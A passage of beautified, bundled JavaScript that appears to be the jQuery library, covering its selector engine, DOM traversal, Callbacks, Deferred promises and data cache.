                    }, se.escape = function(e) {
                        return (e + "").replace(te, ie)
                    }, se.error = function(e) {
                        throw new Error("Syntax error, unrecognized expression: " + e)
                    }, se.uniqueSort = function(e) {
                        var t, i = [],
                            n = 0,
                            o = 0;
                        if (d = !f.detectDuplicates, l = !f.sortStable && e.slice(0), e.sort(j), d) {
                            for (; t = e[o++];) t === e[o] && (n = i.push(o));
                            for (; n--;) e.splice(i[n], 1)
                        }
                        return l = null, e
                    }, s = se.getText = function(e) {
                        var t, i = "",
                            n = 0,
                            o = e.nodeType;
                        if (o) {
                            if (1 === o || 9 === o || 11 === o) {
                                if ("string" == typeof e.textContent) return e.textContent;
                                for (e = e.firstChild; e; e = e.nextSibling) i += s(e)
                            } else if (3 === o || 4 === o) return e.nodeValue
                        } else
                            for (; t = e[n++];) i += s(t);
                        return i
                    }, (w = se.selectors = {
                        cacheLength: 50,
                        createPseudo: ae,
                        match: G,
                        attrHandle: {},
                        find: {},
                        relative: {
                            ">": {
                                dir: "parentNode",
                                first: !0
                            },
                            " ": {
                                dir: "parentNode"
                            },
                            "+": {
                                dir: "previousSibling",
                                first: !0
                            },
                            "~": {
                                dir: "previousSibling"
                            }
                        },
                        preFilter: {
                            ATTR: function(e) {
                                return e[1] = e[1].replace(Z, ee), e[3] = (e[3] || e[4] || e[5] || "").replace(Z, ee), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4)
                            },
                            CHILD: function(e) {
                                return e[1] = e[1].toLowerCase(), "nth" === e[1].slice(0, 3) ? (e[3] || se.error(e[0]), e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3])), e[5] = +(e[7] + e[8] || "odd" === e[3])) : e[3] && se.error(e[0]), e
                            },
                            PSEUDO: function(e) {
                                var t, i = !e[6] && e[2];
                                return G.CHILD.test(e[0]) ? null : (e[3] ? e[2] = e[4] || e[5] || "" : i && X.test(i) && (t = h(i, !0)) && (t = i.indexOf(")", i.length - t) - i.length) && (e[0] = e[0].slice(0, t), e[2] = i.slice(0, t)), e.slice(0, 3))
                            }
                        },
                        filter: {
                            TAG: function(e) {
                                var t = e.replace(Z, ee).toLowerCase();
                                return "*" === e ? function() {
                                    return !0
                                } : function(e) {
                                    return e.nodeName && e.nodeName.toLowerCase() === t
                                }
                            },
                            CLASS: function(e) {
                                var t = p[e + " "];
                                return t || (t = new RegExp("(^|" + O + ")" + e + "(" + O + "|$)")) && p(e, function(e) {
                                    return t.test("string" == typeof e.className && e.className || void 0 !== e.getAttribute && e.getAttribute("class") || "")
                                })
                            },
                            ATTR: function(i, n, o) {
                                return function(e) {
                                    var t = se.attr(e, i);
                                    return null == t ? "!=" === n : !n || (t += "", "=" === n ? t === o : "!=" === n ? t !== o : "^=" === n ? o && 0 === t.indexOf(o) : "*=" === n ? o && -1 < t.indexOf(o) : "$=" === n ? o && t.slice(-o.length) === o : "~=" === n ? -1 < (" " + t.replace(W, " ") + " ").indexOf(o) : "|=" === n && (t === o || t.slice(0, o.length + 1) === o + "-"))
                                }
                            },
                            CHILD: function(h, e, t, v, g) {
                                var m = "nth" !== h.slice(0, 3),
                                    y = "last" !== h.slice(-4),
                                    b = "of-type" === e;
                                return 1 === v && 0 === g ? function(e) {
                                    return !!e.parentNode
                                } : function(e, t, i) {
                                    var n, o, s, r, a, l, d = m !== y ? "nextSibling" : "previousSibling",
                                        c = e.parentNode,
                                        u = b && e.nodeName.toLowerCase(),
                                        p = !i && !b,
                                        f = !1;
                                    if (c) {
                                        if (m) {
                                            for (; d;) {
                                                for (r = e; r = r[d];)
                                                    if (b ? r.nodeName.toLowerCase() === u : 1 === r.nodeType) return !1;
                                                l = d = "only" === h && !l && "nextSibling"
                                            }
                                            return !0
                                        }
                                        if (l = [y ? c.firstChild : c.lastChild], y && p) {
                                            for (f = (a = (n = (o = (s = (r = c)[C] || (r[C] = {}))[r.uniqueID] || (s[r.uniqueID] = {}))[h] || [])[0] === $ && n[1]) && n[2], r = a && c.childNodes[a]; r = ++a && r && r[d] || (f = a = 0) || l.pop();)
                                                if (1 === r.nodeType && ++f && r === e) {
                                                    o[h] = [$, a, f];
                                                    break
                                                }
                                        } else if (p && (f = a = (n = (o = (s = (r = e)[C] || (r[C] = {}))[r.uniqueID] || (s[r.uniqueID] = {}))[h] || [])[0] === $ && n[1]), !1 === f)
                                            for (;
                                                (r = ++a && r && r[d] || (f = a = 0) || l.pop()) && ((b ? r.nodeName.toLowerCase() !== u : 1 !== r.nodeType) || !++f || (p && ((o = (s = r[C] || (r[C] = {}))[r.uniqueID] || (s[r.uniqueID] = {}))[h] = [$, f]), r !== e)););
                                        return (f -= g) === v || f % v == 0 && 0 <= f / v
                                    }
                                }
                            },
                            PSEUDO: function(e, s) {
                                var t, r = w.pseudos[e] || w.setFilters[e.toLowerCase()] || se.error("unsupported pseudo: " + e);
                                return r[C] ? r(s) : 1 < r.length ? (t = [e, e, "", s], w.setFilters.hasOwnProperty(e.toLowerCase()) ? ae(function(e, t) {
                                    for (var i, n = r(e, s), o = n.length; o--;) e[i = H(e, n[o])] = !(t[i] = n[o])
                                }) : function(e) {
                                    return r(e, 0, t)
                                }) : r
                            }
                        },
                        pseudos: {
                            not: ae(function(e) {
                                var n = [],
                                    o = [],
                                    a = u(e.replace(z, "$1"));
                                return a[C] ? ae(function(e, t, i, n) {
                                    for (var o, s = a(e, null, n, []), r = e.length; r--;)(o = s[r]) && (e[r] = !(t[r] = o))
                                }) : function(e, t, i) {
                                    return n[0] = e, a(n, null, i, o), n[0] = null, !o.pop()
                                }
                            }),
                            has: ae(function(t) {
                                return function(e) {
                                    return 0 < se(t, e).length
                                }
                            }),
                            contains: ae(function(t) {
                                return t = t.replace(Z, ee),
                                    function(e) {
                                        return -1 < (e.textContent || e.innerText || s(e)).indexOf(t)
                                    }
                            }),
                            lang: ae(function(i) {
                                return U.test(i || "") || se.error("unsupported lang: " + i), i = i.replace(Z, ee).toLowerCase(),
                                    function(e) {
                                        var t;
                                        do {
                                            if (t = T ? e.lang : e.getAttribute("xml:lang") || e.getAttribute("lang")) return (t = t.toLowerCase()) === i || 0 === t.indexOf(i + "-")
                                        } while ((e = e.parentNode) && 1 === e.nodeType);
                                        return !1
                                    }
                            }),
                            target: function(e) {
                                var t = i.location && i.location.hash;
                                return t && t.slice(1) === e.id
                            },
                            root: function(e) {
                                return e === r
                            },
                            focus: function(e) {
                                return e === S.activeElement && (!S.hasFocus || S.hasFocus()) && !!(e.type || e.href || ~e.tabIndex)
                            },
                            enabled: fe(!1),
                            disabled: fe(!0),
                            checked: function(e) {
                                var t = e.nodeName.toLowerCase();
                                return "input" === t && !!e.checked || "option" === t && !!e.selected
                            },
                            selected: function(e) {
                                return e.parentNode && e.parentNode.selectedIndex, !0 === e.selected
                            },
                            empty: function(e) {
                                for (e = e.firstChild; e; e = e.nextSibling)
                                    if (e.nodeType < 6) return !1;
                                return !0
                            },
                            parent: function(e) {
                                return !w.pseudos.empty(e)
                            },
                            header: function(e) {
                                return V.test(e.nodeName)
                            },
                            input: function(e) {
                                return Y.test(e.nodeName)
                            },
                            button: function(e) {
                                var t = e.nodeName.toLowerCase();
                                return "input" === t && "button" === e.type || "button" === t
                            },
                            text: function(e) {
                                var t;
                                return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || "text" === t.toLowerCase())
                            },
                            first: he(function() {
                                return [0]
                            }),
                            last: he(function(e, t) {
                                return [t - 1]
                            }),
                            eq: he(function(e, t, i) {
                                return [i < 0 ? i + t : i]
                            }),
                            even: he(function(e, t) {
                                for (var i = 0; i < t; i += 2) e.push(i);
                                return e
                            }),
                            odd: he(function(e, t) {
                                for (var i = 1; i < t; i += 2) e.push(i);
                                return e
                            }),
                            lt: he(function(e, t, i) {
                                for (var n = i < 0 ? i + t : i; 0 <= --n;) e.push(n);
                                return e
                            }),
                            gt: he(function(e, t, i) {
                                for (var n = i < 0 ? i + t : i; ++n < t;) e.push(n);
                                return e
                            })
                        }
                    }).pseudos.nth = w.pseudos.eq, {
                        radio: !0,
                        checkbox: !0,
                        file: !0,
                        password: !0,
                        image: !0
                    }) w.pseudos[e] = ue(e);
                for (e in {
                        submit: !0,
                        reset: !0
                    }) w.pseudos[e] = pe(e);

                function ge() {}

                function me(e) {
                    for (var t = 0, i = e.length, n = ""; t < i; t++) n += e[t].value;
                    return n
                }

                function ye(a, e, t) {
                    var l = e.dir,
                        d = e.next,
                        c = d || l,
                        u = t && "parentNode" === c,
                        p = n++;
                    return e.first ? function(e, t, i) {
                        for (; e = e[l];)
                            if (1 === e.nodeType || u) return a(e, t, i);
                        return !1
                    } : function(e, t, i) {
                        var n, o, s, r = [$, p];
                        if (i) {
                            for (; e = e[l];)
                                if ((1 === e.nodeType || u) && a(e, t, i)) return !0
                        } else
                            for (; e = e[l];)
                                if (1 === e.nodeType || u)
                                    if (o = (s = e[C] || (e[C] = {}))[e.uniqueID] || (s[e.uniqueID] = {}), d && d === e.nodeName.toLowerCase()) e = e[l] || e;
                                    else {
                                        if ((n = o[c]) && n[0] === $ && n[1] === p) return r[2] = n[2];
                                        if ((o[c] = r)[2] = a(e, t, i)) return !0
                                    } return !1
                    }
                }

                function be(o) {
                    return 1 < o.length ? function(e, t, i) {
                        for (var n = o.length; n--;)
                            if (!o[n](e, t, i)) return !1;
                        return !0
                    } : o[0]
                }

                function we(e, t, i, n, o) {
                    for (var s, r = [], a = 0, l = e.length, d = null != t; a < l; a++)(s = e[a]) && (i && !i(s, n, o) || (r.push(s), d && t.push(a)));
                    return r
                }

                function xe(f, h, v, g, m, e) {
                    return g && !g[C] && (g = xe(g)), m && !m[C] && (m = xe(m, e)), ae(function(e, t, i, n) {
                        var o, s, r, a = [],
                            l = [],
                            d = t.length,
                            c = e || function(e, t, i) {
                                for (var n = 0, o = t.length; n < o; n++) se(e, t[n], i);
                                return i
                            }(h || "*", i.nodeType ? [i] : i, []),
                            u = !f || !e && h ? c : we(c, a, f, i, n),
                            p = v ? m || (e ? f : d || g) ? [] : t : u;
                        if (v && v(u, p, i, n), g)
                            for (o = we(p, l), g(o, [], i, n), s = o.length; s--;)(r = o[s]) && (p[l[s]] = !(u[l[s]] = r));
                        if (e) {
                            if (m || f) {
                                if (m) {
                                    for (o = [], s = p.length; s--;)(r = p[s]) && o.push(u[s] = r);
                                    m(null, p = [], o, n)
                                }
                                for (s = p.length; s--;)(r = p[s]) && -1 < (o = m ? H(e, r) : a[s]) && (e[o] = !(t[o] = r))
                            }
                        } else p = we(p === t ? p.splice(d, p.length) : p), m ? m(null, t, p, n) : D.apply(t, p)
                    })
                }

                function ke(e) {
                    for (var o, t, i, n = e.length, s = w.relative[e[0].type], r = s || w.relative[" "], a = s ? 1 : 0, l = ye(function(e) {
                            return e === o
                        }, r, !0), d = ye(function(e) {
                            return -1 < H(o, e)
                        }, r, !0), c = [function(e, t, i) {
                            var n = !s && (i || t !== x) || ((o = t).nodeType ? l(e, t, i) : d(e, t, i));
                            return o = null, n
                        }]; a < n; a++)
                        if (t = w.relative[e[a].type]) c = [ye(be(c), t)];
                        else {
                            if ((t = w.filter[e[a].type].apply(null, e[a].matches))[C]) {
                                for (i = ++a; i < n && !w.relative[e[i].type]; i++);
                                return xe(1 < a && be(c), 1 < a && me(e.slice(0, a - 1).concat({
                                    value: " " === e[a - 2].type ? "*" : ""
                                })).replace(z, "$1"), t, a < i && ke(e.slice(a, i)), i < n && ke(e = e.slice(i)), i < n && me(e))
                            }
                            c.push(t)
                        }
                    return be(c)
                }
                return ge.prototype = w.filters = w.pseudos, w.setFilters = new ge, h = se.tokenize = function(e, t) {
                    var i, n, o, s, r, a, l, d = b[e + " "];
                    if (d) return t ? 0 : d.slice(0);
                    for (r = e, a = [], l = w.preFilter; r;) {
                        for (s in i && !(n = R.exec(r)) || (n && (r = r.slice(n[0].length) || r), a.push(o = [])), i = !1, (n = F.exec(r)) && (i = n.shift(), o.push({
                                value: i,
                                type: n[0].replace(z, " ")
                            }), r = r.slice(i.length)), w.filter) !(n = G[s].exec(r)) || l[s] && !(n = l[s](n)) || (i = n.shift(), o.push({
                            value: i,
                            type: s,
                            matches: n
                        }), r = r.slice(i.length));
                        if (!i) break
                    }
                    return t ? r.length : r ? se.error(e) : b(e, a).slice(0)
                }, u = se.compile = function(e, t) {
                    var i, g, m, y, b, n, o = [],
                        s = [],
                        r = A[e + " "];
                    if (!r) {
                        for (t || (t = h(e)), i = t.length; i--;)(r = ke(t[i]))[C] ? o.push(r) : s.push(r);
                        (r = A(e, (g = s, m = o, y = 0 < m.length, b = 0 < g.length, n = function(e, t, i, n, o) {
                            var s, r, a, l = 0,
                                d = "0",
                                c = e && [],
                                u = [],
                                p = x,
                                f = e || b && w.find.TAG("*", o),
                                h = $ += null == p ? 1 : Math.random() || .1,
                                v = f.length;
                            for (o && (x = t === S || t || o); d !== v && null != (s = f[d]); d++) {
                                if (b && s) {
                                    for (r = 0, t || s.ownerDocument === S || (k(s), i = !T); a = g[r++];)
                                        if (a(s, t || S, i)) {
                                            n.push(s);
                                            break
                                        }
                                    o && ($ = h)
                                }
                                y && ((s = !a && s) && l--, e && c.push(s))
                            }
                            if (l += d, y && d !== l) {
                                for (r = 0; a = m[r++];) a(c, u, t, i);
                                if (e) {
                                    if (0 < l)
                                        for (; d--;) c[d] || u[d] || (u[d] = M.call(n));
                                    u = we(u)
                                }
                                D.apply(n, u), o && !e && 0 < u.length && 1 < l + m.length && se.uniqueSort(n)
                            }
                            return o && ($ = h, x = p), c
                        }, y ? ae(n) : n))).selector = e
                    }
                    return r
                }, v = se.select = function(e, t, i, n) {
                    var o, s, r, a, l, d = "function" == typeof e && e,
                        c = !n && h(e = d.selector || e);
                    if (i = i || [], 1 === c.length) {
                        if (2 < (s = c[0] = c[0].slice(0)).length && "ID" === (r = s[0]).type && 9 === t.nodeType && T && w.relative[s[1].type]) {
                            if (!(t = (w.find.ID(r.matches[0].replace(Z, ee), t) || [])[0])) return i;
                            d && (t = t.parentNode), e = e.slice(s.shift().value.length)
                        }
                        for (o = G.needsContext.test(e) ? 0 : s.length; o-- && (r = s[o], !w.relative[a = r.type]);)
                            if ((l = w.find[a]) && (n = l(r.matches[0].replace(Z, ee), J.test(s[0].type) && ve(t.parentNode) || t))) {
                                if (s.splice(o, 1), !(e = n.length && me(s))) return D.apply(i, n), i;
                                break
                            }
                    }
                    return (d || u(e, c))(n, t, !T, i, !t || J.test(e) && ve(t.parentNode) || t), i
                }, f.sortStable = C.split("").sort(j).join("") === C, f.detectDuplicates = !!d, k(), f.sortDetached = le(function(e) {
                    return 1 & e.compareDocumentPosition(S.createElement("fieldset"))
                }), le(function(e) {
                    return e.innerHTML = "<a href='#'></a>", "#" === e.firstChild.getAttribute("href")
                }) || de("type|href|height|width", function(e, t, i) {
                    if (!i) return e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2)
                }), f.attributes && le(function(e) {
                    return e.innerHTML = "<input/>", e.firstChild.setAttribute("value", ""), "" === e.firstChild.getAttribute("value")
                }) || de("value", function(e, t, i) {
                    if (!i && "input" === e.nodeName.toLowerCase()) return e.defaultValue
                }), le(function(e) {
                    return null == e.getAttribute("disabled")
                }) || de(N, function(e, t, i) {
                    var n;
                    if (!i) return !0 === e[t] ? t.toLowerCase() : (n = e.getAttributeNode(t)) && n.specified ? n.value : null
                }), se
            }(S);
            C.find = f, C.expr = f.selectors, C.expr[":"] = C.expr.pseudos, C.uniqueSort = C.unique = f.uniqueSort, C.text = f.getText, C.isXMLDoc = f.isXML, C.contains = f.contains, C.escapeSelector = f.escape;
            var h = function(e, t, i) {
                    for (var n = [], o = void 0 !== i;
                        (e = e[t]) && 9 !== e.nodeType;)
                        if (1 === e.nodeType) {
                            if (o && C(e).is(i)) break;
                            n.push(e)
                        }
                    return n
                },
                k = function(e, t) {
                    for (var i = []; e; e = e.nextSibling) 1 === e.nodeType && e !== t && i.push(e);
                    return i
                },
                $ = C.expr.match.needsContext;

            function A(e, t) {
                return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase()
            }
            var j = /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;

            function E(e, i, n) {
                return y(i) ? C.grep(e, function(e, t) {
                    return !!i.call(e, t, e) !== n
                }) : i.nodeType ? C.grep(e, function(e) {
                    return e === i !== n
                }) : "string" != typeof i ? C.grep(e, function(e) {
                    return -1 < o.call(i, e) !== n
                }) : C.filter(i, e, n)
            }
            C.filter = function(e, t, i) {
                var n = t[0];
                return i && (e = ":not(" + e + ")"), 1 === t.length && 1 === n.nodeType ? C.find.matchesSelector(n, e) ? [n] : [] : C.find.matches(e, C.grep(t, function(e) {
                    return 1 === e.nodeType
                }))
            }, C.fn.extend({
                find: function(e) {
                    var t, i, n = this.length,
                        o = this;
                    if ("string" != typeof e) return this.pushStack(C(e).filter(function() {
                        for (t = 0; t < n; t++)
                            if (C.contains(o[t], this)) return !0
                    }));
                    for (i = this.pushStack([]), t = 0; t < n; t++) C.find(e, o[t], i);
                    return 1 < n ? C.uniqueSort(i) : i
                },
                filter: function(e) {
                    return this.pushStack(E(this, e || [], !1))
                },
                not: function(e) {
                    return this.pushStack(E(this, e || [], !0))
                },
                is: function(e) {
                    return !!E(this, "string" == typeof e && $.test(e) ? C(e) : e || [], !1).length
                }
            });
            var M, P = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;
            (C.fn.init = function(e, t, i) {
                var n, o;
                if (!e) return this;
                if (i = i || M, "string" != typeof e) return e.nodeType ? (this[0] = e, this.length = 1, this) : y(e) ? void 0 !== i.ready ? i.ready(e) : e(C) : C.makeArray(e, this);
                if (!(n = "<" === e[0] && ">" === e[e.length - 1] && 3 <= e.length ? [null, e, null] : P.exec(e)) || !n[1] && t) return !t || t.jquery ? (t || i).find(e) : this.constructor(t).find(e);
                if (n[1]) {
                    if (t = t instanceof C ? t[0] : t, C.merge(this, C.parseHTML(n[1], t && t.nodeType ? t.ownerDocument || t : T, !0)), j.test(n[1]) && C.isPlainObject(t))
                        for (n in t) y(this[n]) ? this[n](t[n]) : this.attr(n, t[n]);
                    return this
                }
                return (o = T.getElementById(n[2])) && (this[0] = o, this.length = 1), this
            }).prototype = C.fn, M = C(T);
            var D = /^(?:parents|prev(?:Until|All))/,
                q = {
                    children: !0,
                    contents: !0,
                    next: !0,
                    prev: !0
                };

            function H(e, t) {
                for (;
                    (e = e[t]) && 1 !== e.nodeType;);
                return e
            }
            C.fn.extend({
                has: function(e) {
                    var t = C(e, this),
                        i = t.length;
                    return this.filter(function() {
                        for (var e = 0; e < i; e++)
                            if (C.contains(this, t[e])) return !0
                    })
                },
                closest: function(e, t) {
                    var i, n = 0,
                        o = this.length,
                        s = [],
                        r = "string" != typeof e && C(e);
                    if (!$.test(e))
                        for (; n < o; n++)
                            for (i = this[n]; i && i !== t; i = i.parentNode)
                                if (i.nodeType < 11 && (r ? -1 < r.index(i) : 1 === i.nodeType && C.find.matchesSelector(i, e))) {
                                    s.push(i);
                                    break
                                }
                    return this.pushStack(1 < s.length ? C.uniqueSort(s) : s)
                },
                index: function(e) {
                    return e ? "string" == typeof e ? o.call(C(e), this[0]) : o.call(this, e.jquery ? e[0] : e) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1
                },
                add: function(e, t) {
                    return this.pushStack(C.uniqueSort(C.merge(this.get(), C(e, t))))
                },
                addBack: function(e) {
                    return this.add(null == e ? this.prevObject : this.prevObject.filter(e))
                }
            }), C.each({
                parent: function(e) {
                    var t = e.parentNode;
                    return t && 11 !== t.nodeType ? t : null
                },
                parents: function(e) {
                    return h(e, "parentNode")
                },
                parentsUntil: function(e, t, i) {
                    return h(e, "parentNode", i)
                },
                next: function(e) {
                    return H(e, "nextSibling")
                },
                prev: function(e) {
                    return H(e, "previousSibling")
                },
                nextAll: function(e) {
                    return h(e, "nextSibling")
                },
                prevAll: function(e) {
                    return h(e, "previousSibling")
                },
                nextUntil: function(e, t, i) {
                    return h(e, "nextSibling", i)
                },
                prevUntil: function(e, t, i) {
                    return h(e, "previousSibling", i)
                },
                siblings: function(e) {
                    return k((e.parentNode || {}).firstChild, e)
                },
                children: function(e) {
                    return k(e.firstChild)
                },
                contents: function(e) {
                    return A(e, "iframe") ? e.contentDocument : (A(e, "template") && (e = e.content || e), C.merge([], e.childNodes))
                }
            }, function(n, o) {
                C.fn[n] = function(e, t) {
                    var i = C.map(this, o, e);
                    return "Until" !== n.slice(-5) && (t = e), t && "string" == typeof t && (i = C.filter(t, i)), 1 < this.length && (q[n] || C.uniqueSort(i), D.test(n) && i.reverse()), this.pushStack(i)
                }
            });
            var N = /[^\x20\t\r\n\f]+/g;

            function O(e) {
                return e
            }

            function L(e) {
                throw e
            }

            function _(e, t, i, n) {
                var o;
                try {
                    e && y(o = e.promise) ? o.call(e).done(t).fail(i) : e && y(o = e.then) ? o.call(e, t, i) : t.apply(void 0, [e].slice(n))
                } catch (e) {
                    i.apply(void 0, [e])
                }
            }
            C.Callbacks = function(n) {
                var e, i;
                n = "string" == typeof n ? (e = n, i = {}, C.each(e.match(N) || [], function(e, t) {
                    i[t] = !0
                }), i) : C.extend({}, n);
                var o, t, s, r, a = [],
                    l = [],
                    d = -1,
                    c = function() {
                        for (r = r || n.once, s = o = !0; l.length; d = -1)
                            for (t = l.shift(); ++d < a.length;) !1 === a[d].apply(t[0], t[1]) && n.stopOnFalse && (d = a.length, t = !1);
                        n.memory || (t = !1), o = !1, r && (a = t ? [] : "")
                    },
                    u = {
                        add: function() {
                            return a && (t && !o && (d = a.length - 1, l.push(t)), function i(e) {
                                C.each(e, function(e, t) {
                                    y(t) ? n.unique && u.has(t) || a.push(t) : t && t.length && "string" !== x(t) && i(t)
                                })
                            }(arguments), t && !o && c()), this
                        },
                        remove: function() {
                            return C.each(arguments, function(e, t) {
                                for (var i; - 1 < (i = C.inArray(t, a, i));) a.splice(i, 1), i <= d && d--
                            }), this
                        },
                        has: function(e) {
                            return e ? -1 < C.inArray(e, a) : 0 < a.length
                        },
                        empty: function() {
                            return a && (a = []), this
                        },
                        disable: function() {
                            return r = l = [], a = t = "", this
                        },
                        disabled: function() {
                            return !a
                        },
                        lock: function() {
                            return r = l = [], t || o || (a = t = ""), this
                        },
                        locked: function() {
                            return !!r
                        },
                        fireWith: function(e, t) {
                            return r || (t = [e, (t = t || []).slice ? t.slice() : t], l.push(t), o || c()), this
                        },
                        fire: function() {
                            return u.fireWith(this, arguments), this
                        },
                        fired: function() {
                            return !!s
                        }
                    };
                return u
            }, C.extend({
                Deferred: function(e) {
                    var s = [
                            ["notify", "progress", C.Callbacks("memory"), C.Callbacks("memory"), 2],
                            ["resolve", "done", C.Callbacks("once memory"), C.Callbacks("once memory"), 0, "resolved"],
                            ["reject", "fail", C.Callbacks("once memory"), C.Callbacks("once memory"), 1, "rejected"]
                        ],
                        o = "pending",
                        r = {
                            state: function() {
                                return o
                            },
                            always: function() {
                                return a.done(arguments).fail(arguments), this
                            },
                            catch: function(e) {
                                return r.then(null, e)
                            },
                            pipe: function() {
                                var o = arguments;
                                return C.Deferred(function(n) {
                                    C.each(s, function(e, t) {
                                        var i = y(o[t[4]]) && o[t[4]];
                                        a[t[1]](function() {
                                            var e = i && i.apply(this, arguments);
                                            e && y(e.promise) ? e.promise().progress(n.notify).done(n.resolve).fail(n.reject) : n[t[0] + "With"](this, i ? [e] : arguments)
                                        })
                                    }), o = null
                                }).promise()
                            },
                            then: function(t, i, n) {
                                var l = 0;

                                function d(o, s, r, a) {
                                    return function() {
                                        var i = this,
                                            n = arguments,
                                            e = function() {
                                                var e, t;
                                                if (!(o < l)) {
                                                    if ((e = r.apply(i, n)) === s.promise()) throw new TypeError("Thenable self-resolution");
                                                    t = e && ("object" == (void 0 === e ? "undefined" : Vt(e)) || "function" == typeof e) && e.then, y(t) ? a ? t.call(e, d(l, s, O, a), d(l, s, L, a)) : (l++, t.call(e, d(l, s, O, a), d(l, s, L, a), d(l, s, O, s.notifyWith))) : (r !== O && (i = void 0, n = [e]), (a || s.resolveWith)(i, n))
                                                }
                                            },
                                            t = a ? e : function() {
                                                try {
                                                    e()
                                                } catch (e) {
                                                    C.Deferred.exceptionHook && C.Deferred.exceptionHook(e, t.stackTrace), l <= o + 1 && (r !== L && (i = void 0, n = [e]), s.rejectWith(i, n))
                                                }
                                            };
                                        o ? t() : (C.Deferred.getStackHook && (t.stackTrace = C.Deferred.getStackHook()), S.setTimeout(t))
                                    }
                                }
                                return C.Deferred(function(e) {
                                    s[0][3].add(d(0, e, y(n) ? n : O, e.notifyWith)), s[1][3].add(d(0, e, y(t) ? t : O)), s[2][3].add(d(0, e, y(i) ? i : L))
                                }).promise()
                            },
                            promise: function(e) {
                                return null != e ? C.extend(e, r) : r
                            }
                        },
                        a = {};
                    return C.each(s, function(e, t) {
                        var i = t[2],
                            n = t[5];
                        r[t[1]] = i.add, n && i.add(function() {
                            o = n
                        }, s[3 - e][2].disable, s[3 - e][3].disable, s[0][2].lock, s[0][3].lock), i.add(t[3].fire), a[t[0]] = function() {
                            return a[t[0] + "With"](this === a ? void 0 : this, arguments), this
                        }, a[t[0] + "With"] = i.fireWith
                    }), r.promise(a), e && e.call(a, a), a
                },
                when: function(e) {
                    var i = arguments.length,
                        t = i,
                        n = Array(t),
                        o = a.call(arguments),
                        s = C.Deferred(),
                        r = function(t) {
                            return function(e) {
                                n[t] = this, o[t] = 1 < arguments.length ? a.call(arguments) : e, --i || s.resolveWith(n, o)
                            }
                        };
                    if (i <= 1 && (_(e, s.done(r(t)).resolve, s.reject, !i), "pending" === s.state() || y(o[t] && o[t].then))) return s.then();
                    for (; t--;) _(o[t], r(t), s.reject);
                    return s.promise()
                }
            });
            var I = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;
            C.Deferred.exceptionHook = function(e, t) {
                S.console && S.console.warn && e && I.test(e.name) && S.console.warn("jQuery.Deferred exception: " + e.message, e.stack, t)
            }, C.readyException = function(e) {
                S.setTimeout(function() {
                    throw e
                })
            };
            var W = C.Deferred();

            function z() {
                T.removeEventListener("DOMContentLoaded", z), S.removeEventListener("load", z), C.ready()
            }
            C.fn.ready = function(e) {
                return W.then(e).catch(function(e) {
                    C.readyException(e)
                }), this
            }, C.extend({
                isReady: !1,
                readyWait: 1,
                ready: function(e) {
                    (!0 === e ? --C.readyWait : C.isReady) || ((C.isReady = !0) !== e && 0 < --C.readyWait || W.resolveWith(T, [C]))
                }
            }), C.ready.then = W.then, "complete" === T.readyState || "loading" !== T.readyState && !T.documentElement.doScroll ? S.setTimeout(C.ready) : (T.addEventListener("DOMContentLoaded", z), S.addEventListener("load", z));
            var R = function e(t, i, n, o, s, r, a) {
                    var l = 0,
                        d = t.length,
                        c = null == n;
                    if ("object" === x(n))
                        for (l in s = !0, n) e(t, i, l, n[l], !0, r, a);
                    else if (void 0 !== o && (s = !0, y(o) || (a = !0), c && (i = a ? (i.call(t, o), null) : (c = i, function(e, t, i) {
                            return c.call(C(e), i)
                        })), i))
                        for (; l < d; l++) i(t[l], n, a ? o : o.call(t[l], l, i(t[l], n)));
                    return s ? t : c ? i.call(t) : d ? i(t[0], n) : r
                },
                F = /^-ms-/,
                B = /-([a-z])/g;

            function X(e, t) {
                return t.toUpperCase()
            }

            function U(e) {
                return e.replace(F, "ms-").replace(B, X)
            }
            var G = function(e) {
                return 1 === e.nodeType || 9 === e.nodeType || !+e.nodeType
            };

            function Y() {
                this.expando = C.expando + Y.uid++
            }
            Y.uid = 1, Y.prototype = {
                cache: function(e) {
                    var t = e[this.expando];
                    return t || (t = {}, G(e) && (e.nodeType ? e[this.expando] = t : Object.defineProperty(e, this.expando, {
                        value: t,
                        configurable: !0
                    }))), t
                },
                set: function(e, t, i) {
                    var n, o = this.cache(e);
                    if ("string" == typeof t) o[U(t)] = i;
                    else
                        for (n in t) o[U(n)] = t[n];
                    return o
                },
                get: function(e, t) {
                    return void 0 === t ? this.cache(e) : e[this.expando] && e[this.expando][U(t)]
                },
                access: function(e, t, i) {
                    return void 0 === t || t && "string" == typeof t && void 0 === i ? this.get(e, t) : (this.set(e, t, i), void 0 !== i ? i : t)
                },
                remove: function(e, t) {
                    var i, n = e[this.expando];
                    if (void 0 !== n) {
                        if (void 0 !== t) {
                            i = (t = Array.isArray(t) ? t.map(U) : (t = U(t)) in n ? [t] : t.match(N) || []).length;
                            for (; i--;) delete n[t[i]]
                        }(void 0 === t || C.isEmptyObject(n)) && (e.nodeType ? e[this.expando] = void 0 : delete e[this.expando])
                    }
                },
                hasData: function(e) {
                    var t = e[this.expando];
                    return void 0 !== t && !C.isEmptyObject(t)
                }
            };
            var V = new Y,
                K = new Y,
                Q = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
                J = /[A-Z]/g;

            function Z(e, t, i) {
                var n, o;
                if (void 0 === i && 1 === e.nodeType)
                    if (n = "data-" + t.replace(J, "-$&").toLowerCase(), "string" == typeof(i = e.getAttribute(n))) {
                        try {
                            i = "true" === (o = i) || "false" !== o && ("null" === o ? null : o === +o + "" ? +o : Q.test(o) ? JSON.parse(o) : o)
                        } catch (e) {}
                        K.set(e, t, i)
                    } else i = void 0;
                return i
            }
            C.extend({
                hasData: function(e) {
                    return K.hasData(e) || V.hasData(e)
                },
                data: function(e, t, i) {
                    return K.access(e, t, i)
                },
                removeData: function(e, t) {
                    K.remove(e, t)
                },
                _data: function(e, t, i) {
                    return V.access(e, t, i)
                },
                _removeData: function(e, t) {
                    V.remove(e, t)
                }
            }), C.fn.extend({
                data: function(i, e) {
                    var t, n, o, s = this[0],
                        r = s && s.attributes;
